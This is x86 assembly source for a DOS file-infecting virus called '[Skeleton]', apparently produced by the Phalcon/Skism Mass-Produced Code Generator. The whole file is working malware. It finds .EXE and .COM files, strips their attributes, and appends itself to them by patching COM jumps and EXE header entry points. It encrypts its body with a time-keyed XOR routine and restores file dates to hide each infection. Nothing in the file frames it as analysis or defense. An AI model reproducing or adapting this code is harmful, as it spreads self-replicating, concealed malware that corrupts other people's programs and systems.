; target.asm : [Skeleton] by Deke
; Created wik the Phalcon/Skism Mass-Produced Code Generator
; from the configuration file skeleton.cfg

.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    100h                   ; COM file starting IP

id = 'DA'                               ; ID word for EXE infections
entry_point: db 0e9h,0,0                ; jmp decrypt

startvirus:
decrypt:                                ; handles encryption and decryption
patch_startencrypt:
          mov  bp,offset startencrypt   ; start of decryption
          mov  ax,(offset heap - offset startencrypt)/2 ; iterations
decrypt_loop:
          db   2eh,81h,76h,0            ; xor word ptr cs:[bp], xxxx
decrypt_value dw  0                     ; initialised at zero for null effect
          inc  bp                       ; calculate new decryption location
          inc  bp
          dec  ax                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          cmp  sp,id                    ; COM or EXE?
          je   restoreEXE
restoreCOM:
          lea  si,[bp+offset save3]
          mov  di,100h
          push di                       ; For later return
          movsb
          jmp  short restoreEXIT
restoreEXE:
          push ds
          push es
          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          lea  si,[bp+offset oldCSIP2]
          lea  di,[bp+offset oldCSIP]
          movsw
          movsw
          movsw
restoreEXIT:
          movsw

          mov  byte ptr [bp+numinfec],3 ; reset infection counter

          mov  ah,1Ah                   ; Set new DTA
          lea  dx,[bp+offset newDTA]    ; new DTA @ DS:DX
          int  21h

          lea  dx,[bp+offset exe_mask]
          call infect_mask
          lea  dx,[bp+offset com_mask]
          call infect_mask

done_infections:
          mov  ah,1ah                   ; restore DTA to default
          mov  dx,80h                   ; DTA in PSP
          cmp  sp,id-4                  ; EXE or COM?
          jz   returnEXE
returnCOM:
          int  21h
          retn                          ; 100h is on stack
returnEXE:
          pop  es
          pop  ds
          int  21h
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+oldCSIP+2],ax
          add  ax,word ptr cs:[bp+oldSSSP+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+oldSSSP]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
oldCSIP   db ?                          ; Original CS:IP (4 bytes)
save3     db 0cdh,20h,0                 ; First 3 bytes of COM file
oldSSSP   dd ?                          ; Original SS:SP
oldCSIP2  dd ?
oldSSSP2  dd ?

creator   db '[MPC]',0                  ; Mass Produced Code Generator
virus     db '[Skeleton]',0
author    db 'Deke',0

infect_mask:
          mov  ah,4eh                   ; find first file
          mov  cx,7                     ; any attribute
findfirstnext:
          int  21h                      ; DS:DX points to mask
          jc   exit_infect_mask         ; No mo files found

          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  ax,3d02h                 ; Open read/write
          int  21h
          xchg ax,bx

          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+offset buffer]    ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ax,4202h                 ; Go to end of file
          xor  cx,cx
          cwd
          int  21h

          cmp  word ptr [bp+buffer],'ZM'; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr [bp+newDTA+1Ah] ; Filesize in DTA
          cmp  ax,65535-(endheap-decrypt) ; Is it too large?
          ja   find_next

          mov  cx,word ptr [bp+buffer+1]; get jmp location
          add  cx,heap-startvirus+3     ; Adjust for virus size
          cmp  ax,cx                    ; Already infected?
          je   find_next
          jmp  infect_com
checkEXE:
          cmp  word ptr [bp+buffer+10h],id ; is it already infected?
          jnz  infect_exe
done_file:
          mov  ax,5701h                 ; Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ; time
          mov  dx,word ptr [bp+newDTA+18h] ; date
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          mov  ch,0
          mov  cl,byte ptr [bp+newDTA+15h] ; Restore original
          call attributes               ; attributes

          cmp  byte ptr [bp+numinfec], 0; Enough infections?
          jnz  find_next
          pop  ax                       ; remove call from stack
          jmp  done_infections

find_next:
          mov  ah,4fh                   ; find next file
          jmp  short findfirstnext
exit_infect_mask: ret

infect_exe:
          mov  cx, 1ah
          push cx
          push bx                       ; Save file handle
          les  ax,dword ptr [bp+buffer+14h] ; Save old entry point
          mov  word ptr [bp+oldCSIP2], ax
          mov  word ptr [bp+oldCSIP2+2], es

          les  ax,dword ptr [bp+buffer+0Eh] ; Save old stack
          mov  word ptr [bp+oldSSSP2],es
          mov  word ptr [bp+oldSSSP2+2],ax

          mov  ax,word ptr [bp+buffer+8]; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax,dword ptr [bp+newDTA+26] ; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr [bp+buffer+14h], dx ; New entry point
          mov  word ptr [bp+buffer+16h], ax

          mov  word ptr [bp+buffer+0Eh], ax ; and stack
          mov  word ptr [bp+buffer+10h], id

          pop  dx                       ; get file length
          pop  ax
          pop  bx                       ; Restore file handle

          add  ax, heap-startvirus      ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr [bp+buffer+4], dx ; new file size
          mov  word ptr [bp+buffer+2], ax

          push cs                       ; restore ES
          pop  es

          mov  ax,word ptr [bp+buffer+14h] ; needed later
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          push cx
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset save3]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
finishinfection:
          add  ax,offset startencrypt-offset decrypt
          push  ax

          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          mov  [bp+decrypt_value],dx    ; Set new encryption value
          lea  di,[bp+offset codestore]
          mov  al,55h                   ; push bp
          stosb
          lea  si,[bp+offset decrypt]   ; Copy encryption function
          mov  cx,startencrypt-decrypt  ; Bytes to move
          push si                       ; Save for later use
          push cx
          rep  movsb

          lea  si,[bp+offset write]     ; Copy writing function
          mov  cx,endwrite-write        ; Bytes to move
          rep  movsb
          pop  cx
          pop  si
          pop  ax
          push di
          push si
          push cx
          rep  movsb                    ; Copy decryption function

          mov  word ptr [bp+patch_startencrypt+1],ax

          mov  al,5dh                   ; pop bx
          stosb
          mov  al,0c3h                  ; retn
          stosb

          call codestore                ; decryption
          pop  cx
          pop  di
          pop  si
          rep  movsb                    ; Restore decryption function

          mov  ax,4200h                 ; Move file pointer
          xor  cx,cx                    ; to beginning of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,40h                   ; Write to file
          lea  dx,[bp+offset buffer]    ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          dec  byte ptr [bp+numinfec]   ; One mo infection
          jmp  done_file

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          lea  dx,[bp+offset newDTA+30] ; filename in DTA
          int  21h
          ret

write:
          pop  bp                       ; Restore relativeness
          mov  ah,40h                   ; Write to file
          lea  dx,[bp+offset decrypt]   ; Concatenate virus
          mov  cx,heap-decrypt          ; # bytes to write
          int  21h
          push bp
endwrite:

exe_mask  db '*.exe',0
com_mask  db '*.com',0
heap:                                   ; Variables not in code
; The following code is the buffer for the write function
codestore:db (startencrypt-decrypt)*2+(endwrite-write)+3 dup (?)
newDTA    db 43 dup (?)                 ; Temporary DTA
numinfec  db ?                          ; Infections this run
buffer    db 1ah dup (?)                ; read buffer
endheap:                                ; End of virus
end       entry_point
